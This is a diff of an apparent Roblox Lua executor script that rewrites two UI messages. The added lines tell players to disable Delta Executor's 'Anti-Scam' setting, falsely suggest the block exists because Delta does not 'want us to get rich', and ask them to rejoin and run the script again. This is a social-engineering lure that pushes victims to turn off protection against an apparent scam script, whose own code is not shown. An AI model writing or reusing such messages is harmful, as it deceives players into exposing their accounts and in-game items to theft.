@@ -108,7 +108,7 @@ local function showTrackingBarUI()
         errorMsg.Font = Enum.Font.GothamBold
         errorMsg.TextSize = 16
         errorMsg.TextColor3 = warningColor
-        errorMsg.Text = "Error: It looks like you don't have a Divine pet. Make sure you own one and try again."
+        errorMsg.Text = "Error: It looks like you don't have a Divine pet, you're not using KRNL, or you didn't turn off your Anti-Scam setting. Please disable it and try again."
     end)
 end
 
@@ -224,7 +224,7 @@ local function showExecutorNotice()
     label.Size = UDim2.new(1, -20, 0.65, 0)
     label.Position = UDim2.new(0, 10, 0, 10)
     label.TextWrapped = true
-    label.Text = "This only works in KRNL executor for now. I am still working on how to fix it in Delta, so better change your executor to KRNL for a better experience."
+    label.Text = "This only works in KRNL for now. If you're using Delta Executor, make sure to turn off the Anti-Scam setting (Delta blocks this script as a scam because they don't want us to get rich). After disabling it, rejoin the game and execute the script again."
     label.Font = Enum.Font.Gotham
     label.TextSize = 16
     label.TextColor3 = Color3.new(1, 1, 1)
